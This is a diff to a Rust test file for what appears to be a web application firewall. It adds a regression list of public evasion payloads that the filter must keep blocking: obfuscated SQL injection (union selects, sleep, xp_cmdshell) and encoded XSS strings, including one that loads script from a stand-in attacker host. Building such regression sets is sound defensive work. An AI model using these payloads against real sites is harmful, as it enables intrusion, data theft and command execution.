@@ -4,6 +4,16 @@
 //! apostrophes, prose with the keywords, URLs, JSON, addresses, dates, numbers, browsers'
 //! User-Agents). The built-in rules' tests run them through the engine (engine.rs); the
 //! `gates_by_measurement` test below prints what each candidate prefilter keeps and costs.
+//!
+//! The `BYPASS` array holds the payloads of the public WAF-evasion lists (SecLists' fuzzing
+//! corpora and the known WAF-bypass writeups), in the form an attacker's request would carry
+//! them: comments inside keywords, partly encoded keywords, entities and escapes, parser shapes
+//! (`</title>`, unclosed and split tags, backticks). They are known evasions the shipped sets
+//! must keep refusing: refused by the built-in sets together like the rest of the corpus
+//! (`the_whole_filter_refuses_the_corpus_…`) and in the blackbox run (tests/ftw/,
+//! scripts/ftw-convert.py), so a change to a rule, a transformation or a prefilter that lets one
+//! through again fails. A regression set, not a measure of the filter against evasion: it holds
+//! what the sets catch (CRS's own regression tests are that measure).
 
 pub(crate) const SQLI: &[&str] = &[
     // Numeric context.
@@ -239,4 +249,79 @@ pub(crate) const XSS: &[&str] = &[
     "<button formaction=javascript:alert(1)>x</button>",
     "<keygen autofocus onfocus=alert(1)>",
     "<select autofocus onfocus=alert(1)>",
+];
+
+/// The payloads of the public WAF-evasion lists, in the form the request carries them: what the
+/// corpora above are, with the obfuscation an attacker adds to keep a filter from seeing them.
+/// Everything here must be refused by the built-in sets together: an evasion added here comes with
+/// the rule that catches it, and one the sets let through stays out of this list.
+pub(crate) const BYPASS: &[&str] = &[
+    // Comments and encodings inside the keywords (MySQL reads `un/**/ion`, a filter that strips
+    // comments with a space or a keyword search on the raw bytes does not).
+    "1 un/**/ion sel/**/ect 1,2",
+    "1'/**/and/**/'1'='1",
+    "1 union/*foo*/select 1,2",
+    "1 /*!50000union*/ /*!50000select*/ 1",
+    "1 uni%6Fn select 1",
+    "1%20union%20select%201",
+    "1%27%20or%201%3D1",
+    "%2527 or 1=1",
+    // No spaces, the wrong spaces.
+    "1'OR'1'='1",
+    "1' and '1'like'1",
+    "1'\tor 1=1",
+    "1'\nOR 1=1",
+    // Tautologies of the shapes the quoted and numeric rules take apart.
+    "1 AND 2=2",
+    "1 and 3>2",
+    "1 and (1)=(1)",
+    "1 and 1 in (1)",
+    "1 or 1=1 limit 0,1",
+    "0' xor 1=1 #",
+    // The named calls and tables, with what else the rule looks for.
+    "1'||sleep(5)||'",
+    "1;exec('select 1')--",
+    "1;EXEC xp_cmdshell('dir')",
+    "1' group by 1 having 1=1 --",
+    "1' and exists(select 1)--",
+    "1' or exists(select * from users)--",
+    "1 union (select 1,2)",
+    "1 union select 1,2,3 from information_schema.tables--",
+    "' UNION SELECT table_name FROM information_schema.tables#",
+    // Parser shapes: what closes a tag or an attribute context first, entities of the named
+    // characters and the handlers, backticks, encodings of the same.
+    "&#X3C;script&#X3E;alert(1)&#X3C;/script&#X3E;",
+    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
+    "<svg onload=alert&lpar;1&rpar;>",
+    "<img src=x onerror=alert&lpar;1&rpar;>",
+    "<iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\">",
+    "<script>\\u0061lert(1)</script>",
+    "<a href=\"javascript&#58;alert(1)\">x</a>",
+    "<a href=\"javascript&colon;alert(1)\">x</a>",
+    "<a href=\"java&#x0A;script:alert(1)\">x</a>",
+    "<a href=\"jav\tascript:alert(1)\">x</a>",
+    "<img/src=`x`/onerror=alert(1)>",
+    "<img src=`x`onerror=alert(1)>",
+    "<img src=x:x onerror=alert(1)>",
+    "<img onerror=alert(1) src>",
+    "<style onload=alert(1)></style>",
+    "<body onpageshow=alert(1)>",
+    "<body background=javascript:alert(1)>",
+    "<input onauxclick=alert(1)>",
+    "<xss id=x tabindex=1 onactivate=alert(1)></xss>",
+    "</title><script>alert(1)</script>",
+    "</textarea><script>alert(1)</script>",
+    "</style><script>alert(1)</script>",
+    "<svg onload=alert(1)//",
+    "<svg onload=alert(1)<!--",
+    "<svg\tonload=alert(1)>",
+    "<object onerror=alert(1)>",
+    "<video src=x onerror=alert(1)>",
+    "<audio src=x onerror=alert(1)>",
+    "<svg><a xlink:href=javascript:alert(1)><text x=10 y=10>click</text></a></svg>",
+    "<math href=javascript:alert(1)>click</math>",
+    "<script/xss src=//evil.example/x.js></script>",
+    "<isindex type=image src=1 onerror=alert(1)>",
+    "<img src=1 href=1 onerror=\"javascript:alert(1)\">",
+    "%3Csvg%2Fonload%3Dalert%281%29%3E",
 ];
